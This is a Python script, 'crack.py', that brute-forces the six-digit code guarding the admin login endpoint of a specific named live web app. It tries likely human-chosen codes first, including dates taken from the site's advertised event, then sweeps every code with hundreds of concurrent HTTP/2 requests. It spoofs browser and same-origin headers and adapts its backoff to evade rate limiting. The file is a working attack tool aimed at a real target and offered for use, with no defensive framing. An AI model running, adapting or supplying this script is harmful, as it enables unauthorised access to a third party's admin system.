#!/usr/bin/env python3
"""
VICEVERSE /api/admin/auth — prioritised blast with a time budget.

    pip install "httpx[http2]"
    python crack.py                       # 60s budget
    python crack.py --priority-only       # ~2s, high-probability codes only
    python crack.py --budget 900 --concurrency 400
"""

import argparse
import asyncio
import itertools
import random
import sys
import time
from collections import deque

import httpx

API = "https://vice-verse-ivc.vercel.app/api/admin/auth"
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")


def fmt(n):
    return f"{n:06d}"


def priority_codes():
    """Human-chosen guesses first. ~2.2k codes, deduped."""
    out, seen = [], set()

    def add(s):
        s = s if isinstance(s, str) else fmt(s)
        if len(s) == 6 and s.isdigit() and s not in seen:
            seen.add(s)
            out.append(s)

    for d in "0123456789":                       # 000000 .. 999999
        add(d * 6)
    for a in range(100):                         # 121212 / 003003
        add(f"{a:02d}" * 3)
    for a in range(10):                          # 112233 / 998877
        for b in range(10):
            add(f"{a}{a}{b}{b}{(a + b) % 10}{(a + b) % 10}")
    for a in range(1000):                        # 6-digit palindromes
        s = f"{a:03d}"
        add(s + s[::-1])
    # event-flavoured: the site advertises Oct 24 / Oct 25, 5:30 PM
    for s in ("241024", "241025", "251024", "261024", "261025", "241026",
              "202410", "202510", "202511", "202610", "102425", "102024",
              "102524", "102526", "241020", "251020", "173000", "053000",
              "123456", "654321", "420420", "696969", "007007", "314159"):
        add(s)
    for n in range(1000):                        # low serials
        add(n)
    return out


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--budget", type=float, default=60.0)
    ap.add_argument("--concurrency", type=int, default=300)
    ap.add_argument("--priority-only", action="store_true")
    args = ap.parse_args()

    prio = priority_codes()
    stream = (fmt(n) for n in range(1000000))
    feed = iter(prio) if args.priority_only else itertools.chain(prio, stream)

    print(f"[*] {len(prio)} priority codes, concurrency={args.concurrency}, "
          f"budget={args.budget:.0f}s")

    st = {"found": None, "done": 0, "r429": 0, "ok": 0, "penalty": 0.0,
          "t0": time.monotonic(), "stop": False}
    retry: deque = deque()

    def elapsed():
        return time.monotonic() - st["t0"]

    def expired():
        return elapsed() >= args.budget or st["found"]

    limits = httpx.Limits(max_connections=args.concurrency,
                          max_keepalive_connections=args.concurrency)
    headers = {"User-Agent": UA, "Accept": "application/json",
               "Origin": "https://vice-verse-ivc.vercel.app",
               "Referer": "https://vice-verse-ivc.vercel.app/admin"}

    try:
        client = httpx.AsyncClient(headers=headers, limits=limits, http2=True,
                                   timeout=httpx.Timeout(4.0))
    except ImportError:
        print("[!] h2 missing — falling back to HTTP/1.1 (slower). "
              'pip install "httpx[http2]"')
        client = httpx.AsyncClient(headers=headers, limits=limits,
                                   timeout=httpx.Timeout(4.0))

    async with client:
        async def worker():
            while not expired():
                if st["penalty"]:
                    await asyncio.sleep(st["penalty"] * random.random())

                code = retry.pop() if retry else next(feed, None)
                if code is None:
                    return

                for _ in range(8):
                    if expired():
                        return
                    try:
                        r = await client.post(API, json={"code": code})
                    except httpx.HTTPError:
                        await asyncio.sleep(0.15)
                        continue

                    if r.status_code == 200:
                        try:
                            if r.json().get("success") is True:
                                st["found"] = code
                                return
                        except ValueError:
                            pass
                        st["done"] += 1
                        st["ok"] += 1
                        st["penalty"] = max(0.0, st["penalty"] * 0.995)
                        break

                    if r.status_code == 429:
                        st["r429"] += 1
                        st["penalty"] = min(1.5, st["penalty"] + 0.03)
                        await asyncio.sleep(0.2 + random.random() * 0.8)
                        continue

                    st["done"] += 1
                    break
                else:
                    retry.appendleft(code)      # still locked after 8 tries

        async def reporter():
            while not expired():
                await asyncio.sleep(5)
                el = elapsed()
                rate = st["done"] / el if el else 0
                print(f"[-] {el:4.0f}s | {st['done']} tried | {rate:.0f}/s | "
                      f"429s={st['r429']} | backoff={st['penalty']:.2f}")

        workers = [asyncio.create_task(worker()) for _ in range(args.concurrency)]
        rep = asyncio.create_task(reporter())
        for w in asyncio.as_completed(workers):
            await w
        rep.cancel()

    code = st["found"]
    el = elapsed()
    print()
    if code:
        print(f"[+] HIT: {code}   in {el:.1f}s   "
              f"({st['done']} attempts, {st['r429']} 429s)")
    else:
        rate = st["done"] / el if el else 0
        print(f"[-] No hit in {el:.0f}s. {st['done']} tried, {rate:.0f}/s, "
              f"{st['r429']} rate-limited. Re-run to continue or raise budget.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(130)
